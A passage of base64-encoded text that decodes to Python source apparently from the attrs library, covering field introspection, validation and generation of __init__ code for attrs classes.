YXNzLlxuXG4gICAgVGhlIHR1cGxlIGFsc28gYWxsb3dzIGFjY2Vzc2luZyB0aGUgZmllbGRzIGJ5IHRoZWlyIG5hbWVzIChzZWUgYmVsb3cgZm9yXG4gICAgZXhhbXBsZXMpLlxuXG4gICAgOnBhcmFtIHR5cGUgY2xzOiBDbGFzcyB0byBpbnRyb3NwZWN0LlxuXG4gICAgOnJhaXNlIFR5cGVFcnJvcjogSWYgKmNscyogaXMgbm90IGEgY2xhc3MuXG4gICAgOnJhaXNlIGF0dHIuZXhjZXB0aW9ucy5Ob3RBbkF0dHJzQ2xhc3NFcnJvcjogSWYgKmNscyogaXMgbm90IGFuIGBgYXR0cnNgYFxuICAgICAgICBjbGFzcy5cblxuICAgIDpydHlwZTogdHVwbGUgKHdpdGggbmFtZSBhY2Nlc3NvcnMpIG9mIGBhdHRycy5BdHRyaWJ1dGVgXG5cbiAgICAuLiAgdmVyc2lvbmNoYW5nZWQ6OiAxNi4yLjAgUmV0dXJuZWQgdHVwbGUgYWxsb3dzIGFjY2Vzc2luZyB0aGUgZmllbGRzXG4gICAgICAgIGJ5IG5hbWUuXG4gICAgIiIiXG4gICAgaWYgbm90IGlzY2xhc3MoY2xzKTpcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJQYXNzZWQgb2JqZWN0IG11c3QgYmUgYSBjbGFzcy4iKVxuICAgIGF0dHJzID0gZ2V0YXR0cihjbHMsICJfX2F0dHJzX2F0dHJzX18iLCBOb25lKVxuICAgIGlmIGF0dHJzIGlzIE5vbmU6XG4gICAgICAgIHJhaXNlIE5vdEFuQXR0cnNDbGFzc0Vycm9yKFxuICAgICAgICAgICAgIntjbHMhcn0gaXMgbm90IGFuIGF0dHJzLWRlY29yYXRlZCBjbGFzcy4iLmZvcm1hdChjbHM9Y2xzKVxuICAgICAgICApXG4gICAgcmV0dXJuIGF0dHJzXG5cblxuZGVmIGZpZWxkc19kaWN0KGNscyk6XG4gICAgIiIiXG4gICAgUmV0dXJuIGFuIG9yZGVyZWQgZGljdGlvbmFyeSBvZiBgYGF0dHJzYGAgYXR0cmlidXRlcyBmb3IgYSBjbGFzcywgd2hvc2VcbiAgICBrZXlzIGFyZSB0aGUgYXR0cmlidXRlIG5hbWVzLlxuXG4gICAgOnBhcmFtIHR5cGUgY2xzOiBDbGFzcyB0byBpbnRyb3NwZWN0LlxuXG4gICAgOnJhaXNlIFR5cGVFcnJvcjogSWYgKmNscyogaXMgbm90IGEgY2xhc3MuXG4gICAgOnJhaXNlIGF0dHIuZXhjZXB0aW9ucy5Ob3RBbkF0dHJzQ2xhc3NFcnJvcjogSWYgKmNscyogaXMgbm90IGFuIGBgYXR0cnNgYFxuICAgICAgICBjbGFzcy5cblxuICAgIDpydHlwZTogYW4gb3JkZXJlZCBkaWN0IHdoZXJlIGtleXMgYXJlIGF0dHJpYnV0ZSBuYW1lcyBhbmQgdmFsdWVzIGFyZVxuICAgICAgICBgYXR0cnMuQXR0cmlidXRlYFxcXFwgcy4gVGhpcyB3aWxsIGJlIGEgYGRpY3RgIGlmIGl0XCdzXG4gICAgICAgIG5hdHVyYWxseSBvcmRlcmVkIGxpa2Ugb24gUHl0aG9uIDMuNisgb3IgYW5cbiAgICAgICAgOmNsYXNzOmB+Y29sbGVjdGlvbnMuT3JkZXJlZERpY3RgIG90aGVyd2lzZS5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE4LjEuMFxuICAgICIiIlxuICAgIGlmIG5vdCBpc2NsYXNzKGNscyk6XG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiUGFzc2VkIG9iamVjdCBtdXN0IGJlIGEgY2xhc3MuIilcbiAgICBhdHRycyA9IGdldGF0dHIoY2xzLCAiX19hdHRyc19hdHRyc19fIiwgTm9uZSlcbiAgICBpZiBhdHRycyBpcyBOb25lOlxuICAgICAgICByYWlzZSBOb3RBbkF0dHJzQ2xhc3NFcnJvcihcbiAgICAgICAgICAgICJ7Y2xzIXJ9IGlzIG5vdCBhbiBhdHRycy1kZWNvcmF0ZWQgY2xhc3MuIi5mb3JtYXQoY2xzPWNscylcbiAgICAgICAgKVxuICAgIHJldHVybiBvcmRlcmVkX2RpY3QoKChhLm5hbWUsIGEpIGZvciBhIGluIGF0dHJzKSlcblxuXG5kZWYgdmFsaWRhdGUoaW5zdCk6XG4gICAgIiIiXG4gICAgVmFsaWRhdGUgYWxsIGF0dHJpYnV0ZXMgb24gKmluc3QqIHRoYXQgaGF2ZSBhIHZhbGlkYXRvci5cblxuICAgIExlYXZlcyBhbGwgZXhjZXB0aW9ucyB0aHJvdWdoLlxuXG4gICAgOnBhcmFtIGluc3Q6IEluc3RhbmNlIG9mIGEgY2xhc3Mgd2l0aCBgYGF0dHJzYGAgYXR0cmlidXRlcy5cbiAgICAiIiJcbiAgICBpZiBfY29uZmlnLl9ydW5fdmFsaWRhdG9ycyBpcyBGYWxzZTpcbiAgICAgICAgcmV0dXJuXG5cbiAgICBmb3IgYSBpbiBmaWVsZHMoaW5zdC5fX2NsYXNzX18pOlxuICAgICAgICB2ID0gYS52YWxpZGF0b3JcbiAgICAgICAgaWYgdiBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHYoaW5zdCwgYSwgZ2V0YXR0cihpbnN0LCBhLm5hbWUpKVxuXG5cbmRlZiBfaXNfc2xvdF9jbHMoY2xzKTpcbiAgICByZXR1cm4gIl9fc2xvdHNfXyIgaW4gY2xzLl9fZGljdF9fXG5cblxuZGVmIF9pc19zbG90X2F0dHIoYV9uYW1lLCBiYXNlX2F0dHJfbWFwKTpcbiAgICAiIiJcbiAgICBDaGVjayBpZiB0aGUgYXR0cmlidXRlIG5hbWUgY29tZXMgZnJvbSBhIHNsb3QgY2xhc3MuXG4gICAgIiIiXG4gICAgcmV0dXJuIGFfbmFtZSBpbiBiYXNlX2F0dHJfbWFwIGFuZCBfaXNfc2xvdF9jbHMoYmFzZV9hdHRyX21hcFthX25hbWVdKVxuXG5cbmRlZiBfbWFrZV9pbml0KFxuICAgIGNscyxcbiAgICBhdHRycyxcbiAgICBwcmVfaW5pdCxcbiAgICBwb3N0X2luaXQsXG4gICAgZnJvemVuLFxuICAgIHNsb3RzLFxuICAgIGNhY2hlX2hhc2gsXG4gICAgYmFzZV9hdHRyX21hcCxcbiAgICBpc19leGMsXG4gICAgY2xzX29uX3NldGF0dHIsXG4gICAgYXR0cnNfaW5pdCxcbik6XG4gICAgaGFzX2Nsc19vbl9zZXRhdHRyID0gKFxuICAgICAgICBjbHNfb25fc2V0YXR0ciBpcyBub3QgTm9uZSBhbmQgY2xzX29uX3NldGF0dHIgaXMgbm90IHNldHRlcnMuTk9fT1BcbiAgICApXG5cbiAgICBpZiBmcm96ZW4gYW5kIGhhc19jbHNfb25fc2V0YXR0cjpcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRnJvemVuIGNsYXNzZXMgY2FuXCd0IHVzZSBvbl9zZXRhdHRyLiIpXG5cbiAgICBuZWVkc19jYWNoZWRfc2V0YXR0ciA9IGNhY2hlX2hhc2ggb3IgZnJvemVuXG4gICAgZmlsdGVyZWRfYXR0cnMgPSBbXVxuICAgIGF0dHJfZGljdCA9IHt9XG4gICAgZm9yIGEgaW4gYXR0cnM6XG4gICAgICAgIGlmIG5vdCBhLmluaXQgYW5kIGEuZGVmYXVsdCBpcyBOT1RISU5HOlxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICBmaWx0ZXJlZF9hdHRycy5hcHBlbmQoYSlcbiAgICAgICAgYXR0cl9kaWN0W2EubmFtZV0gPSBhXG5cbiAgICAgICAgaWYgYS5vbl9zZXRhdHRyIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgaWYgZnJvemVuIGlzIFRydWU6XG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRnJvemVuIGNsYXNzZXMgY2FuXCd0IHVzZSBvbl9zZXRhdHRyLiIpXG5cbiAgICAgICAgICAgIG5lZWRzX2NhY2hlZF9zZXRhdHRyID0gVHJ1ZVxuICAgICAgICBlbGlmIGhhc19jbHNfb25fc2V0YXR0ciBhbmQgYS5vbl9zZXRhdHRyIGlzIG5vdCBzZXR0ZXJzLk5PX09QOlxuICAgICAgICAgICAgbmVlZHNfY2FjaGVkX3NldGF0dHIgPSBUcnVlXG5cbiAgICB1bmlxdWVfZmlsZW5hbWUgPSBfZ2VuZXJhdGVfdW5pcXVlX2ZpbGVuYW1lKGNscywgImluaXQiKVxuXG4gICAgc2NyaXB0LCBnbG9icywgYW5ub3RhdGlvbnMgPSBfYXR0cnNfdG9faW5pdF9zY3JpcHQoXG4gICAgICAgIGZpbHRlcmVkX2F0dHJzLFxuICAgICAgICBmcm96ZW4sXG4gICAgICAgIHNsb3RzLFxuICAgICAgICBwcmVfaW5pdCxcbiAgICAgICAgcG9zdF9pbml0LFxuICAgICAgICBjYWNoZV9oYXNoLFxuICAgICAgICBiYXNlX2F0dHJfbWFwLFxuICAgICAgICBpc19leGMsXG4gICAgICAgIG5lZWRzX2NhY2hlZF9zZXRhdHRyLFxuICAgICAgICBoYXNfY2xzX29uX3NldGF0dHIsXG4gICAgICAgIGF0dHJzX2luaXQsXG4gICAgKVxuICAgIGlmIGNscy5fX21vZHVsZV9fIGluIHN5cy5tb2R1bGVzOlxuICAgICAgICAjIFRoaXMgbWFrZXMgdHlwaW5nLmdldF90eXBlX2hpbnRzKENMUy5fX2luaXRfXykgcmVzb2x2ZSBzdHJpbmcgdHlwZXMuXG4gICAgICAgIGdsb2JzLnVwZGF0ZShzeXMubW9kdWxlc1tjbHMuX19tb2R1bGVfX10uX19kaWN0X18pXG5cbiAgICBnbG9icy51cGRhdGUoeyJOT1RISU5HIjogTk9USElORywgImF0dHJfZGljdCI6IGF0dHJfZGljdH0pXG5cbiAgICBpZiBuZWVkc19jYWNoZWRfc2V0YXR0cjpcbiAgICAgICAgIyBTYXZlIHRoZSBsb29rdXAgb3ZlcmhlYWQgaW4gX19pbml0X18gaWYgd2UgbmVlZCB0byBjaXJjdW12ZW50XG4gICAgICAgICMgc2V0YXR0ciBob29rcy5cbiAgICAgICAgZ2xvYnNbIl9jYWNoZWRfc2V0YXR0ciJdID0gX29ial9zZXRhdHRyXG5cbiAgICBpbml0ID0gX21ha2VfbWV0aG9kKFxuICAgICAgICAiX19hdHRyc19pbml0X18iIGlmIGF0dHJzX2luaXQgZWxzZSAiX19pbml0X18iLFxuICAgICAgICBzY3JpcHQsXG4gICAgICAgIHVuaXF1ZV9maWxlbmFtZSxcbiAgICAgICAgZ2xvYnMsXG4gICAgKVxuICAgIGluaXQuX19hbm5vdGF0aW9uc19fID0gYW5ub3RhdGlvbnNcblxuICAgIHJldHVybiBpbml0XG5cblxuZGVmIF9zZXRhdHRyKGF0dHJfbmFtZSwgdmFsdWVfdmFyLCBoYXNfb25fc2V0YXR0cik6XG4gICAgIiIiXG4gICAgVXNlIHRoZSBjYWNoZWQgb2JqZWN0LnNldGF0dHIgdG8gc2V0ICphdHRyX25hbWUqIHRvICp2YWx1ZV92YXIqLlxuICAgICIiIlxuICAgIHJldHVybiAiX3NldGF0dHIoXCclc1wnLCAlcykiICUgKGF0dHJfbmFtZSwgdmFsdWVfdmFyKVxuXG5cbmRlZiBfc2V0YXR0cl93aXRoX2NvbnZlcnRlcihhdHRyX25hbWUsIHZhbHVlX3ZhciwgaGFzX29uX3NldGF0dHIpOlxuICAgICIiIlxuICAgIFVzZSB0aGUgY2FjaGVkIG9iamVjdC5zZXRhdHRyIHRvIHNldCAqYXR0cl9uYW1lKiB0byAqdmFsdWVfdmFyKiwgYnV0IHJ1blxuICAgIGl0cyBjb252ZXJ0ZXIgZmlyc3QuXG4gICAgIiIiXG4gICAgcmV0dXJuICJfc2V0YXR0cihcJyVzXCcsICVzKCVzKSkiICUgKFxuICAgICAgICBhdHRyX25hbWUsXG4gICAgICAgIF9pbml0X2NvbnZlcnRlcl9wYXQgJSAoYXR0cl9uYW1lLCksXG4gICAgICAgIHZhbHVlX3ZhcixcbiAgICApXG5cblxuZGVmIF9hc3NpZ24oYXR0cl9uYW1lLCB2YWx1ZSwgaGFzX29uX3NldGF0dHIpOlxuICAgICIiIlxuICAgIFVubGVzcyAqYXR0cl9uYW1lKiBoYXMgYW4gb25fc2V0YXR0ciBob29rLCB1c2Ugbm9ybWFsIGFzc2lnbm1lbnQuIE90aGVyd2lzZVxuICAgIHJlbGVnYXRlIHRvIF9zZXRhdHRyLlxuICAgICIiIlxuICAgIGlmIGhhc19vbl9zZXRhdHRyOlxuICAgICAgICByZXR1cm4gX3NldGF0dHIoYXR0cl9uYW1lLCB2YWx1ZSwgVHJ1ZSlcblxuICAgIHJldHVybiAic2VsZi4lcyA9ICVzIiAlIChhdHRyX25hbWUsIHZhbHVlKVxuXG5cbmRlZiBfYXNzaWduX3dpdGhfY29udmVydGVyKGF0dHJfbmFtZSwgdmFsdWVfdmFyLCBoYXNfb25fc2V0YXR0cik6XG4gICAgIiIiXG4gICAgVW5sZXNzICphdHRyX25hbWUqIGhhcyBhbiBvbl9zZXRhdHRyIGhvb2ssIHVzZSBub3JtYWwgYXNzaWdubWVudCBhZnRlclxuICAgIGNvbnZlcnNpb24uIE90aGVyd2lzZSByZWxlZ2F0ZSB0byBfc2V0YXR0cl93aXRoX2NvbnZlcnRlci5cbiAgICAiIiJcbiAgICBpZiBoYXNfb25fc2V0YXR0cjpcbiAgICAgICAgcmV0dXJuIF9zZXRhdHRyX3dpdGhfY29udmVydGVyKGF0dHJfbmFtZSwgdmFsdWVfdmFyLCBUcnVlKVxuXG4gICAgcmV0dXJuICJzZWxmLiVzID0gJXMoJXMpIiAlIChcbiAgICAgICAgYXR0cl9uYW1lLFxuICAgICAgICBfaW5pdF9jb252ZXJ0ZXJfcGF0ICUgKGF0dHJfbmFtZSwpLFxuICAgICAgICB2YWx1ZV92YXIsXG4gICAgKVxuXG5cbmlmIFBZMjpcblxuICAgIGRlZiBfdW5wYWNrX2t3X29ubHlfcHkyKGF0dHJfbmFtZSwgZGVmYXVsdD1Ob25lKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFVucGFjayAqYXR0cl9uYW1lKiBmcm9tIF9rd19vbmx5IGRpY3QuXG4gICAgICAgICIiIlxuICAgICAgICBpZiBkZWZhdWx0IGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgYXJnX2RlZmF1bHQgPSAiLCAlcyIgJSBkZWZhdWx0XG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBhcmdfZGVmYXVsdCA9ICIiXG4gICAgICAgIHJldHVybiAiJXMgPSBfa3dfb25seS5wb3AoXCclc1wnJXMpIiAlIChcbiAgICAgICAgICAgIGF0dHJfbmFtZSxcbiAgICAgICAgICAgIGF0dHJfbmFtZSxcbiAgICAgICAgICAgIGFyZ19kZWZhdWx0LFxuICAgICAgICApXG5cbiAgICBkZWYgX3VucGFja19rd19vbmx5X2xpbmVzX3B5Mihrd19vbmx5X2FyZ3MpOlxuICAgICAgICAiIiJcbiAgICAgICAgVW5wYWNrIGFsbCAqa3dfb25seV9hcmdzKiBmcm9tIF9rd19vbmx5IGRpY3QgYW5kIGhhbmRsZSBlcnJvcnMuXG5cbiAgICAgICAgR2l2ZW4gYSBsaXN0IG9mIHN0cmluZ3MgInthdHRyX25hbWV9IiBhbmQgInthdHRyX25hbWV9PXtkZWZhdWx0fSJcbiAgICAgICAgZ2VuZXJhdGVzIGxpc3Qgb2YgbGluZXMgb2YgY29kZSB0aGF0IHBvcCBhdHRycyBmcm9tIF9rd19vbmx5IGRpY3QgYW5kXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvciBzaW1pbGFyIHRvIGJ1aWx0aW4gaWYgcmVxdWlyZWQgYXR0ciBpcyBtaXNzaW5nIG9yXG4gICAgICAgIGV4dHJhIGtleSBpcyBwYXNzZWQuXG5cbiAgICAgICAgPj4+IHByaW50KCJcXG4iLmpvaW4oX3VucGFja19rd19vbmx5X2xpbmVzX3B5MihbImEiLCAiYj00MiJdKSkpXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGEgPSBfa3dfb25seS5wb3AoXCdhXCcpXG4gICAgICAgICAgICBiID0gX2t3X29ubHkucG9wKFwnYlwnLCA0MilcbiAgICAgICAgZXhjZXB0IEtleUVycm9yIGFzIF9rZXlfZXJyb3I6XG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgLi4uXG4gICAgICAgIGlmIF9rd19vbmx5OlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgICAgIC4uLlxuICAgICAgICAiIiJcbiAgICAgICAgbGluZXMgPSBbInRyeToiXVxuICAgICAgICBsaW5lcy5leHRlbmQoXG4gICAgICAgICAgICAiICAgICIgKyBfdW5wYWNrX2t3X29ubHlfcHkyKCphcmcuc3BsaXQoIj0iKSlcbiAgICAgICAgICAgIGZvciBhcmcgaW4ga3dfb25seV9hcmdzXG4gICAgICAgIClcbiAgICAgICAgbGluZXMgKz0gIiIiXFxcbmV4Y2VwdCBLZXlFcnJvciBhcyBfa2V5X2Vycm9yOlxuICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgXCdfX2luaXRfXygpIG1pc3NpbmcgcmVxdWlyZWQga2V5d29yZC1vbmx5IGFyZ3VtZW50OiAlc1wnICUgX2tleV9lcnJvclxuICAgIClcbmlmIF9rd19vbmx5OlxuICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgXCdfX2luaXRfXygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgJXJcJ1xuICAgICAgICAlIG5leHQoaXRlcihfa3dfb25seSkpXG4gICAgKVxuIiIiLnNwbGl0KFxuICAgICAgICAgICAgIlxcbiJcbiAgICAgICAgKVxuICAgICAgICByZXR1cm4gbGluZXNcblxuXG5kZWYgX2F0dHJzX3RvX2luaXRfc2NyaXB0KFxuICAgIGF0dHJzLFxuICAgIGZyb3plbixcbiAgICBzbG90cyxcbiAgICBwcmVfaW5pdCxcbiAgICBwb3N0X2luaXQsXG4gICAgY2FjaGVfaGFzaCxcbiAgICBiYXNlX2F0dHJfbWFwLFxuICAgIGlzX2V4YyxcbiAgICBuZWVkc19jYWNoZWRfc2V0YXR0cixcbiAgICBoYXNfY2xzX29uX3NldGF0dHIsXG4gICAgYXR0cnNfaW5pdCxcbik6XG4gICAgIiIiXG4gICAgUmV0dXJuIGEgc2NyaXB0IG9mIGFuIGluaXRpYWxpemVyIGZvciAqYXR0cnMqIGFuZCBhIGRpY3Qgb2YgZ2xvYmFscy5cblxuICAgIFRoZSBnbG9iYWxzIGFyZSBleHBlY3RlZCBieSB0aGUgZ2VuZXJhdGVkIHNjcmlwdC5cblxuICAgIElmICpmcm96ZW4qIGlzIFRydWUsIHdlIGNhbm5vdCBzZXQgdGhlIGF0dHJpYnV0ZXMgZGlyZWN0bHkgc28gd2UgdXNlXG4gICAgYSBjYWNoZWQgYGBvYmplY3QuX19zZXRhdHRyX19gYC5cbiAgICAiIiJcbiAgICBsaW5lcyA9IFtdXG4gICAgaWYgcHJlX2luaXQ6XG4gICAgICAgIGxpbmVzLmFwcGVuZCgic2VsZi5fX2F0dHJzX3ByZV9pbml0X18oKSIpXG5cbiAgICBpZiBuZWVkc19jYWNoZWRfc2V0YXR0cjpcbiAgICAgICAgbGluZXMuYXBwZW5kKFxuICAgICAgICAgICAgIyBDaXJjdW12ZW50IHRoZSBfX3NldGF0dHJfXyBkZXNjcmlwdG9yIHRvIHNhdmUgb25lIGxvb2t1cCBwZXJcbiAgICAgICAgICAgICMgYXNzaWdubWVudC5cbiAgICAgICAgICAgICMgTm90ZSBfc2V0YXR0ciB3aWxsIGJlIHVzZWQgYWdhaW4gYmVsb3cgaWYgY2FjaGVfaGFzaCBpcyBUcnVlXG4gICAgICAgICAgICAiX3NldGF0dHIgPSBfY2FjaGVkX3NldGF0dHIuX19nZXRfXyhzZWxmLCBzZWxmLl9fY2xhc3NfXykiXG4gICAgICAgIClcblxuICAgIGlmIGZyb3plbiBpcyBUcnVlOlxuICAgICAgICBpZiBzbG90cyBpcyBUcnVlOlxuICAgICAgICAgICAgZm10X3NldHRlciA9IF9zZXRhdHRyXG4gICAgICAgICAgICBmbXRfc2V0dGVyX3dpdGhfY29udmVydGVyID0gX3NldGF0dHJfd2l0aF9jb252ZXJ0ZXJcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICMgRGljdCBmcm96ZW4gY2xhc3NlcyBhc3NpZ24gZGlyZWN0bHkgdG8gX19kaWN0X18uXG4gICAgICAgICAgICAjIEJ1dCBvbmx5IGlmIHRoZSBhdHRyaWJ1dGUgZG9lc25cJ3QgY29tZSBmcm9tIGFuIGFuY2VzdG9yIHNsb3RcbiAgICAgICAgICAgICMgY2xhc3MuXG4gICAgICAgICAgICAjIE5vdGUgX2luc3RfZGljdCB3aWxsIGJlIHVzZWQgYWdhaW4gYmVsb3cgaWYgY2FjaGVfaGFzaCBpcyBUcnVlXG4gICAgICAgICAgICBsaW5lcy5hcHBlbmQoIl9pbnN0X2RpY3QgPSBzZWxmLl9fZGljdF9fIilcblxuICAgICAgICAgICAgZGVmIGZtdF9zZXR0ZXIoYXR0cl9uYW1lLCB2YWx1ZV92YXIsIGhhc19vbl9zZXRhdHRyKTpcbiAgICAgICAgICAgICAgICBpZiBfaXNfc2xvdF9hdHRyKGF0dHJfbmFtZSwgYmFzZV9hdHRyX21hcCk6XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBfc2V0YXR0cihhdHRyX25hbWUsIHZhbHVlX3ZhciwgaGFzX29uX3NldGF0dHIpXG5cbiAgICAgICAgICAgICAgICByZXR1cm4gIl9pbnN0X2RpY3RbXCclc1wnXSA9ICVzIiAlIChhdHRyX25hbWUsIHZhbHVlX3ZhcilcblxuICAgICAgICAgICAgZGVmIGZtdF9zZXR0ZXJfd2l0aF9jb252ZXJ0ZXIoXG4gICAgICAgICAgICAgICAgYXR0cl9uYW1lLCB2YWx1ZV92YXIsIGhhc19vbl9zZXRhdHRyXG4gICAgICAgICAgICApOlxuICAgICAgICAgICAgICAgIGlmIGhhc19vbl9zZXRhdHRyIG9yIF9pc19zbG90X2F0dHIoYXR0cl9uYW1lLCBiYXNlX2F0dHJfbWFwKTpcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9zZXRhdHRyX3dpdGhfY29udmVydGVyKFxuICAgICAgICAgICAgICAgICAgICAgICAgYXR0cl9uYW1lLCB2YWx1ZV92YXIsIGhhc19vbl9zZXRhdHRyXG4gICAgICAgICAgICAgICAgICAgIClcblxuICAgICAgICAgICAgICAgIHJldHVybiAiX2luc3RfZGljdFtcJyVzXCddID0gJXMoJXMpIiAlIChcbiAgICAgICAgICAgICAgICAgICAgYXR0cl9uYW1lLFxuICAgICAgICAgICAgICAgICAgICBfaW5pdF9jb252ZXJ0ZXJfcGF0ICUgKGF0dHJfbmFtZSwpLFxuICAgICAgICAgICAgICAgICAgICB2YWx1ZV92YXIsXG4gICAgICAgICAgICAgICAgKVxuXG4gICAgZWxzZTpcbiAgICAgICAgIyBOb3QgZnJvemVuLlxuICAgICAgICBmbXRfc2V0dGVyID0gX2Fzc2lnblxuICAgICAgICBmbXRfc2V0dGVyX3dpdGhfY29udmVydGVyID0gX2Fzc2lnbl93aXRoX2NvbnZlcnRlclxuXG4gICAgYXJncyA9IFtdXG4gICAga3dfb25seV9hcmdzID0gW11cbiAgICBhdHRyc190b192YWxpZGF0ZSA9IFtdXG5cbiAgICAjIFRoaXMgaXMgYSBkaWN0aW9uYXJ5IG9mIG5hbWVzIHRvIHZhbGlkYXRvciBhbmQgY29udmVydGVyIGNhbGxhYmxlcy5cbiAgICAjIEluamVjdGluZyB0aGlzIGludG8gX19pbml0X18gZ2xvYmFscyBsZXRzIHVzIGF2b2lkIGxvb2t1cHMuXG4gICAgbmFtZXNfZm9yX2dsb2JhbHMgPSB7fVxuICAgIGFubm90YXRpb25zID0geyJyZXR1cm4iOiBOb25lfVxuXG4gICAgZm9yIGEgaW4gYXR0cnM6XG4gICAgICAgIGlmIGEudmFsaWRhdG9yOlxuICAgICAgICAgICAgYXR0cnNfdG9fdmFsaWRhdGUuYXBwZW5kKGEpXG5cbiAgICAgICAgYXR0cl9uYW1lID0gYS5uYW1lXG4gICAgICAgIGhhc19vbl9zZXRhdHRyID0gYS5vbl9zZXRhdHRyIGlzIG5vdCBOb25lIG9yIChcbiAgICAgICAgICAgIGEub25fc2V0YXR0ciBpcyBub3Qgc2V0dGVycy5OT19PUCBhbmQgaGFzX2Nsc19vbl9zZXRhdHRyXG4gICAgICAgIClcbiAgICAgICAgYXJnX25hbWUgPSBhLm5hbWUubHN0cmlwKCJfIilcblxuICAgICAgICBoYXNfZmFjdG9yeSA9IGlzaW5zdGFuY2UoYS5kZWZhdWx0LCBGYWN0b3J5KVxuICAgICAgICBpZiBoYXNfZmFjdG9yeSBhbmQgYS5kZWZhdWx0LnRha2VzX3NlbGY6XG4gICAgICAgICAgICBtYXliZV9zZWxmID0gInNlbGYiXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBtYXliZV9zZWxmID0gIiJcblxuICAgICAgICBpZiBhLmluaXQgaXMgRmFsc2U6XG4gICAgICAgICAgICBpZiBoYXNfZmFjdG9yeTpcbiAgICAgICAgICAgICAgICBpbml0X2ZhY3RvcnlfbmFtZSA9IF9pbml0X2ZhY3RvcnlfcGF0LmZvcm1hdChhLm5hbWUpXG4gICAgICAgICAgICAgICAgaWYgYS5jb252ZXJ0ZXIgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZChcbiAgICAgICAgICAgICAgICAgICAgICAgIGZtdF9zZXR0ZXJfd2l0aF9jb252ZXJ0ZXIoXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0cl9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluaXRfZmFjdG9yeV9uYW1lICsgIiglcykiICUgKG1heWJlX3NlbGYsKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYXNfb25fc2V0YXR0cixcbiAgICAgICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgICAgICBjb252X25hbWUgPSBfaW5pdF9jb252ZXJ0ZXJfcGF0ICUgKGEubmFtZSwpXG4gICAgICAgICAgICAgICAgICAgIG5hbWVzX2Zvcl9nbG9iYWxzW2NvbnZfbmFtZV0gPSBhLmNvbnZlcnRlclxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZChcbiAgICAgICAgICAgICAgICAgICAgICAgIGZtdF9zZXR0ZXIoXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0cl9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluaXRfZmFjdG9yeV9uYW1lICsgIiglcykiICUgKG1heWJlX3NlbGYsKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYXNfb25fc2V0YXR0cixcbiAgICAgICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIG5hbWVzX2Zvcl9nbG9iYWxzW2luaXRfZmFjdG9yeV9uYW1lXSA9IGEuZGVmYXVsdC5mYWN0b3J5XG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGlmIGEuY29udmVydGVyIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQoXG4gICAgICAgICAgICAgICAgICAgICAgICBmbXRfc2V0dGVyX3dpdGhfY29udmVydGVyKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJfbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYXR0cl9kaWN0W1wnJXNcJ10uZGVmYXVsdCIgJSAoYXR0cl9uYW1lLCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFzX29uX3NldGF0dHIsXG4gICAgICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgY29udl9uYW1lID0gX2luaXRfY29udmVydGVyX3BhdCAlIChhLm5hbWUsKVxuICAgICAgICAgICAgICAgICAgICBuYW1lc19mb3JfZ2xvYmFsc1tjb252X25hbWVdID0gYS5jb252ZXJ0ZXJcbiAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICBsaW5lcy5hcHBlbmQoXG4gICAgICAgICAgICAgICAgICAgICAgICBmbXRfc2V0dGVyKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJfbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYXR0cl9kaWN0W1wnJXNcJ10uZGVmYXVsdCIgJSAoYXR0cl9uYW1lLCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFzX29uX3NldGF0dHIsXG4gICAgICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgZWxpZiBhLmRlZmF1bHQgaXMgbm90IE5PVEhJTkcgYW5kIG5vdCBoYXNfZmFjdG9yeTpcbiAgICAgICAgICAgIGFyZyA9ICIlcz1hdHRyX2RpY3RbXCclc1wnXS5kZWZhdWx0IiAlIChhcmdfbmFtZSwgYXR0cl9uYW1lKVxuICAgICAgICAgICAgaWYgYS5rd19vbmx5OlxuIC